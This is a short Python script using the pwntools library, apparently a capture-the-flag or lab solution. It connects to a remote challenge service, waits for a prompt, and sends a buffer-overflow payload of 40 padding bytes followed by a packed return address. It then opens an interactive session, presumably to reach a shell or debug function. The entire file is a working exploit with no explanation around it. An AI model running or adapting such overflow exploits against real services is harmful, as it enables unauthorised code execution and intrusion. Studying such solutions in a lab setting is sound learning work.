from pwn import *

context.arch = "amd64"

io = remote("up.zoolab.org", 30001)

io.recvuntil("distribution are you using?")

# Debug Position
io.sendline(b"A"*40+pack(0x4011DD))

io.recvline()

io.interactive()

io.close()
